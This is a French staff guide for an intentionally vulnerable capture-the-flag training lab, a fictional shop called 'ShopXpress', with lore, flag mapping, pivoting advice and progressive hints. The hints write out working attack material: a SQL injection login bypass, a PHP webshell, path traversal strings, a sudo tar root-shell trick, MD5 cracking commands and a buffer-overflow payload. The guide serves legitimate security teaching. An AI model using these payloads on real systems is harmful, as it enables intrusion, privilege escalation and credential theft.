# Scénario & guide d'animation — lab découverte « ShopXpress » (M1)

> **Document staff / encadrant.** À ne PAS distribuer aux étudiants : il contient
> le lore complet, la cartographie des flags, les **indices progressifs** et les
> mécanismes de chaque vulnérabilité. L'énoncé public est dans `docs/enonce.md` ;
> le corrigé pas-à-pas dans `docs/walkthrough.md` ; la topo dans `docs/topology.md`.

---

## 1. Lore — « ShopXpress »

**ShopXpress** est une **boutique de vente en ligne** (high-tech & accessoires)
montée vite par une petite équipe. Derrière la vitrine soignée, le code part dans
tous les sens : une boutique PHP bricolée, un back-office « gérant » mal protégé,
et des secrets oubliés dans des fichiers de conf.

**Le personnel** (visible sur la page « À propos » du site) :

| Personne | Rôle | Compte | Mot de passe | Rôle dans le scénario |
|---|---|---|---|---|
| **Julien Martin** | Admin SI / Responsable e-commerce | `j.martin` | *(clé SSH only)* | Détient le **back-office** ; sa clé SSH et son poste admin sont la cible finale. |
| **Sophie Morel** | Gestion des stocks / logistique | `s.morel` | `superman` | Compte **réutilisé** partout (conf base64 → SMB → SSH) : le maillon faible. |
| **Lucas Petit** | Service client (SAV) | `l.petit` | `liverpool` | Hash présent dans le backup (diversion / entraînement au crack). |
| **Nadia Roux** | Comptabilité | `n.roux` | `chocolate` | Idem : hash crackable, compte secondaire. |
| **Karim Dubois** | Développeur / IT | `k.dubois` | — | **Le coupable** : il a laissé l'**upload non sécurisé** du back-office *et* les identifiants en **base64** dans `config.php` (« TODO: sortir ce secret du code avant la prod… »). |

> 🔑 **Note crack** : les mots de passe (`superman`, `liverpool`, `chocolate`, et
> indirectement le maître `ShopXpress-Adm-2024`) sont des entrées classiques de
> `rockyou` ou se déduisent par reverse — donc **réalistes et accessibles** à un M1.

**Le fil rouge.** Un développeur négligent (Karim) laisse traîner un **upload non
filtré** et un **secret encodé** sur la boutique. L'attaquant force l'**auth du
back-office** (SQLi), lit des **fichiers serveur** (path traversal), dépose un
**webshell** (RCE), puis devient `root`. Le secret encodé ouvre le compte de Sophie
(stocks), **réutilisé** sur le partage de fichiers où dorment une capture réseau en
clair, une image piégée et un backup de hashs. De fil en aiguille — réutilisation de
mot de passe, cron mal fichu, clé SSH oubliée — l'attaquant rebondit jusqu'au **poste
de Julien** et s'empare du **mot de passe maître du back-office** : c'est la
**compromission complète**. Morale : une poignée de négligences suffit à dérouler
toute la pelote.

---

## 2. Objectifs pédagogiques (M1 — niveau découverte)

À la fin de la séance, l'étudiant doit avoir :

1. **Fait le tour des outils de base** d'un pentest : `nmap`, `whatweb`/`nikto`,
   `gobuster`/`ffuf`, `curl`, `nc`, **injection SQL** & **path traversal** à la main,
   `base64`, `sudo -l`/GTFOBins, `ssh`/`scp` (`-J`, `-D`), `proxychains`/`chisel`,
   `smbclient`, `tshark`/Wireshark, `strings`/`binwalk`/`steghide`, `john`/`hashcat`
   + `rockyou`, `objdump`/`gdb`/Ghidra, un exploit `python3`/`pwntools`.
2. **Compris une chaîne de compromission réaliste** : foothold web → escalade locale →
   mouvement latéral → cible finale ; chaque étape **débloque** la suivante.
3. **Saisi la notion de segmentation & de pivot** : un seul service est exposé ;
   on n'entre dans le réseau interne qu'**en pivotant** par la machine compromise.
4. **Distingué encodage / hachage / chiffrement** : base64 (réversible sans clé),
   MD5 (empreinte → crack par dictionnaire), XOR (chiffrement « jouet » réversible).
5. **Vu les vulnérabilités web classiques** : **SQLi** (contournement d'auth),
   **path traversal** (lecture de fichiers arbitraires), **upload non filtré** (RCE).
6. **Manipulé des permissions UNIX** : SUID, `sudo NOPASSWD`, fichier world-writable,
   clé privée mal rangée — autant de fautes de conf qui mènent à `root`.

**Posture.** Lab **intentionnellement vulnérable**, **isolé**, à usage **pédagogique
autorisé** uniquement. Rien de ce qui est ici ne doit sortir du périmètre du lab.

---

## 3. Cartographie des catégories CTF → 10 flags

Le lab couvre les catégories classiques (Recon, **Web : SQLi / LFI / upload**,
Encodage, Forensique, Stéganographie, Crypto/Cracking, Réseau/Pivot, Privesc, Pwn,
Reverse) sous leur **forme débutant**, réparties sur les 10 flags figés du contrat
de scoring.

| # | Flag (env) | Catégorie | Machine | Utilisateur cible | Objectif d'apprentissage |
|---|---|---|---|---|---|
| 1 | `FLAG_WEB_RCE`     | **Web : SQLi → upload RCE** | web | `www-data` | Contourner l'auth du back-office (**SQLi** `admin'--`), y déposer un **webshell** (upload PHP non filtré) → premier *foothold*. |
| 2 | `FLAG_WEB_REVERSE` | **Web : lecture de fichiers** (path traversal) | web | — | Un téléchargement de factures lit un **chemin arbitraire** (`../`) → fichiers serveur (`/etc/passwd`, conf, rapport interne). *(bonus)* |
| 3 | `FLAG_WEB_ROOT`    | **Encodage + Privesc**      | web | `root` | base64 ≠ chiffrement (creds dans `config.php`) ; `sudo -l` + GTFOBins (`tar`) → root. |
| 4 | `FLAG_FILES_RECON` | **Recon réseau / SMB**      | files | `invité` | Énumérer un partage SMB **anonyme** après pivot. |
| 5 | `FLAG_DB_PIVOT`    | **Forensique réseau**       | files | — | Lire une capture `.pcap` : un login passe **en clair**. *(bonus)* |
| 6 | `FLAG_DB_ROOT`     | **Stéganographie**          | files | — | Données cachées **après** une image (`strings`/`binwalk`). *(bonus)* |
| 7 | `FLAG_FILES_RCE`   | **Crypto / Password-cracking** | files | `s.morel` | Casser un **hash MD5** au dictionnaire (`john` + `rockyou`). |
| 8 | `FLAG_FILES_ROOT`  | **Privesc système** (cron)  | files | `root` | Un **cron root** exécute un script **world-writable** → injection → root. |
| 9 | `FLAG_WS_ROOT`     | **Pwn** (buffer overflow)   | admin | `root` | BOF **ret2win** sur un SUID sans canari/PIE → root. |
| 10| `FLAG_FINAL`       | **Reverse engineering**     | admin | — | Dé-XOR d'un binaire → mot de passe maître → **accès back-office**. |

> Les **3 vulns web** demandées sont toutes exercées sur la machine 1 : la **SQLi**
> (auth bypass) est la **porte** vers l'upload (flag #1), le **path traversal**
> (flag #2) lit les fichiers serveur, l'**upload PHP** (flag #1) donne la RCE.

### Épine dorsale (spine) vs bonus

```
        [1]──▶[3]──▶[4]──▶[7]──▶[8]──▶[9]──▶[10]      ← SPINE (bloquante, linéaire)
  SQLi+RCE  web root  recon  crack  cron   pwn   final
                 │
        [2] LFI  │ [5] Forensique │ [6] Stégano       ← BONUS (non bloquants)
```

- **Spine (1→3→4→7→8→9→10)** : chaîne obligatoire, chaque flag **débloque** le suivant
  (prérequis CTFd). C'est le chemin minimal « point d'entrée → compromission complète ».
- **Bonus (2, 5, 6)** : non bloquants, branchés sur la spine pour **couvrir** la lecture
  de fichiers (LFI), la Forensique et la Stéganographie sans gêner la progression.

---

## 4. Le pivot — l'idée centrale à faire passer

> « On ne **voit** que `web`. Tout le reste, il faut **entrer** pour le voir. »

- Un **seul** service est publié sur l'hôte (`web`, le point d'entrée). `files` et
  `admin` sont sur un réseau **interne** (`lan`, `internal: true`) : injoignables
  directement depuis la Kali de l'étudiant.
- Après avoir compromis `web` (webshell `www-data` → `root`), l'étudiant dispose d'une
  machine qui, elle, **a une route vers le LAN** (posée par le firewall). Il doit donc
  **rebondir par `web`**.

**Deux voies principales** (à proposer selon le niveau) :

1. **`chisel` + `proxychains`** — méthode reine quand on n'a qu'un webshell : `chisel
   server` côté Kali, `chisel client` déposé via la RCE sur `web`, reverse SOCKS, puis
   `proxychains smbclient`/`ssh` vers le LAN.
2. **`ssh -J` / `ssh -D`** — utile UNE FOIS qu'on a un vrai compte SSH **dans** le LAN
   (`s.morel@files`, mdp craqué) pour rebondir vers `admin`.

> 💡 Insister à l'oral : `web` n'expose **aucun compte SSH** (root verrouillé, www-data
> sans shell). On ne « saute » donc pas par un `ssh -J ...@web` : on franchit DMZ→LAN
> **par le shell déjà obtenu** sur `web`. La segmentation n'a pas disparu (un seul port
> exposé), elle est **franchie** parce que la machine de bordure a été prise.

---

## 5. Indices progressifs (à délivrer si un binôme bloque)

Donne **un cran à la fois**. Le niveau 3 est quasi la solution ; ne l'utilise qu'en
dernier recours. **Aucun indice ne révèle la valeur du flag** (elle est lue dans un
fichier une fois l'accès obtenu).

### #1 — `FLAG_WEB_RCE` · Web : SQLi → upload RCE · ★★
- **I1 (orientation)** : « Le site a un **espace gérant** (`/connexion.php`). Et le
  back-office permet d'**importer un visuel produit**… »
- **I2 (technique)** : « L'auth concatène ta saisie dans une requête SQL : contourne-la
  (**injection SQL**). Une fois gérant, l'**upload** ne vérifie ni l'extension ni le
  type → dépose un `.php`. »
- **I3 (quasi-solution)** : « Login : `user=admin'--` / `pass=x`. Puis upload de
  `<?php system($_GET['cmd']); ?>` → `/uploads/shell.php?cmd=cat /var/www/flag_user.txt`. »

### #2 — `FLAG_WEB_REVERSE` · Web : lecture de fichiers (path traversal) · ★ *(bonus)*
- **I1** : « Le téléchargement de factures prend un **nom de fichier en paramètre**
  (`/telecharger.php?facture=…`). Et s'il n'était pas validé ? »
- **I2** : « Aucune validation → tu peux **remonter l'arborescence** avec `../`. Essaie
  des fichiers serveur (`/etc/passwd`, la conf de l'appli, un rapport interne). »
- **I3** : « `?facture=../../private/rapport-ventes.txt` (le flag), `?facture=../config/config.php`
  (creds base64), `?facture=../../../../etc/passwd`. »

### #3 — `FLAG_WEB_ROOT` · Encodage + Privesc · ★★
- **I1** : « Dans la conf de l'appli (`config.php`, lisible via #2 ou après la RCE), un
  dev a laissé un mot doux (`TODO k.dubois`). »
- **I2** : « `$SMB_CREDENTIALS_B64` est en **base64** — pas du chiffrement. Décode.
  Puis : qu'as-tu le droit de lancer en `sudo` ? »
- **I3** : « `echo <b64> | base64 -d` → `s.morel:superman`. `sudo -l` montre `tar` en
  NOPASSWD → GTFOBins : `sudo tar -cf /dev/null /dev/null --checkpoint=1
  --checkpoint-action=exec=/bin/sh`. »

### #4 — `FLAG_FILES_RECON` · Recon SMB · ★★
- **I1** : « Tu es entré dans le LAN (pivot). Quelles machines, quels ports ? Pense
  **SMB**. »
- **I2** : « `files` (172.31.20.11) expose un partage **anonyme**. Liste-le sans creds. »
- **I3** : « `smbclient -N -L //172.31.20.11` puis `smbclient -N //172.31.20.11/public`,
  récupère `note-interne.txt`. »

### #5 — `FLAG_DB_PIVOT` · Forensique réseau · ★ *(bonus)*
- **I1** : « Le partage public contient un export de test du service de sauvegarde.
  Un fichier `.pcap`… »
- **I2** : « Ouvre la capture. Le protocole utilisé fait passer l'authentification
  **en clair**. »
- **I3** : « `strings capture.pcap | grep -i -E 'user|pass|flag'` (ou Wireshark →
  *Follow TCP Stream*). »

### #6 — `FLAG_DB_ROOT` · Stéganographie · ★★ *(bonus)*
- **I1** : « L'image `photo-produit.jpg` du partage s'affiche normalement… mais pèse un
  peu lourd. Et après la fin de l'image ? »
- **I2** : « Des données sont **ajoutées à la suite** du JPEG. `strings`/`binwalk`. »
- **I3** : « `strings photo-produit.jpg | tail` → bloc `--- ShopXpress backup ---` avec
  une passphrase (`stock-backup-2024`) et le flag. »

### #7 — `FLAG_FILES_RCE` · Crypto / Cracking · ★★
- **I1** : « Le partage public a un dossier `backup/`. Un export d'annuaire… avec des
  empreintes. »
- **I2** : « `hashes.txt` contient des **MD5**. Casse celui de `s.morel` au dictionnaire. »
- **I3** : « `john --format=Raw-MD5 --wordlist=rockyou.txt hashes.txt` → `superman`.
  Ce compte ouvre le partage **`stock`** (`smbclient //…/stock -U s.morel`) ou un SSH. »

### #8 — `FLAG_FILES_ROOT` · Privesc cron · ★★★
- **I1** : « Sur `files`, qu'est-ce qui tourne **en root** à intervalle régulier ?
  Regarde `/etc/cron.d`. »
- **I2** : « Le cron exécute `/opt/shopxpress/maintenance.sh`. Quels sont les **droits**
  de ce script ? »
- **I3** : « Il est `world-writable` (666). Ajoute une ligne (`cp /root/flag_root.txt
  /tmp/x; chmod 644 /tmp/x` ou un reverse shell), attends ~1 min (le tick cron). Pense
  à **looter `/root/id_admin`** : c'est la clé SSH de l'admin. »

### #9 — `FLAG_WS_ROOT` · Pwn (BOF ret2win) · ★★★
- **I1** : « Avec la clé `id_admin`, connecte-toi à `admin` en `j.martin`. Il y a un
  binaire **SUID** suspect : `vault`. »
- **I2** : « `vault` lit 256 octets dans un tampon de 64 → débordement. Pas de canari,
  pas de PIE (`checksec`). Une fonction `win()` fait le boulot ; il faut y **retourner**. »
- **I3** : « Offset = **72** (64 + 8 rbp). Adresse de `win` via `objdump -d vault`
  (≈ `0x401196`). Payload : `python3 -c 'import sys;sys.stdout.buffer.write(b"A"*72+
  (0x401196).to_bytes(8,"little"))'`, puis envoie tes commandes au shell root obtenu. »

### #10 — `FLAG_FINAL` · Reverse (XOR) · ★★★
- **I1** : « Toujours sur `admin`, un autre SUID : `backoffice-check`. Il **vérifie** un
  mot de passe maître qui n'apparaît nulle part en clair. »
- **I2** : « Désassemble (`objdump`/Ghidra) ou `ltrace` : la saisie est **XORée** avec
  une clé constante avant comparaison à un tableau `enc[]`. »
- **I3** : « Clé = `0x5b`. Dé-XORe `enc[]` → `ShopXpress-Adm-2024`. Donne-le à
  `backoffice-check` → il lit le **trophée** (`/opt/shopxpress/trophy`) = accès back-office. »

---

## 6. Durée & difficulté (repères pour un M1)

| Étape | Catégorie | Difficulté | Durée indicative |
|---|---|---|---|
| Recon initial (`nmap`, `whatweb`, `gobuster`) | Recon | ★ | 10–15 min |
| #1 SQLi auth bypass + upload RCE | Web | ★★ | 15–25 min |
| #2 Path traversal *(bonus)* | Web/LFI | ★ | 5–10 min |
| #3 base64 + `sudo tar` | Encodage/Privesc | ★★ | 15–20 min |
| Pivot vers le LAN | Réseau | ★★ | 15–25 min |
| #4 SMB anonyme | Recon | ★★ | 10 min |
| #5 pcap *(bonus)* | Forensique | ★ | 5–10 min |
| #6 stégano *(bonus)* | Stégano | ★★ | 10 min |
| #7 crack MD5 | Crypto | ★★ | 10–15 min |
| #8 cron world-writable | Privesc | ★★★ | 15–20 min |
| #9 BOF ret2win | Pwn | ★★★ | 25–40 min |
| #10 reverse XOR | Reverse | ★★★ | 20–30 min |

**Total** : ~**3 à 4 h** pour la spine complète, plus les bonus. En TP encadré de
2 h, viser **jusqu'à `files` rooté** (#1→#8) ; garder `admin` (pwn + reverse) pour
les plus avancés ou une 2ᵉ séance.

---

## 7. Évolutivité — extensions possibles

Le plan est **évolutif** (l'encadrant ajoutera des éléments). Quelques pistes
cohérentes avec le niveau, sans casser le contrat de scoring (10 flags figés) :

1. **Enrichir le web** : ajouter un **stored XSS** dans les avis produits, une **IDOR**
   sur les commandes (`?commande=ID`), ou un **CSRF** sur le back-office — sans nouveau
   flag (démos) ou en recyclant un bonus.
2. **Durcir la privesc `admin`** : remplacer le ret2win « pédagogique » par un ret2win
   avec une petite ROP (pop rdi), pour un public qui maîtrise déjà le BOF de base.
3. **Ajouter une brique réseau** : un service interne supplémentaire sur le LAN découvert
   au `nmap` post-pivot, pour muscler le mouvement latéral.
4. **Varier la crypto** : une 2ᵉ liste de hash (sel, ou `sha1`) pour travailler `hashcat`
   en plus de `john`, ou un mini-chiffrement César/Vigenère en amont du XOR.

> Garder la règle d'or : **noms de services et variables `.env` inchangés** (compat
> launcher/plugin), un seul service publié, entrypoints *restart-safe*. Toute
> nouvelle vuln se branche sur la spine ou en bonus sans toucher au plan de contrôle.
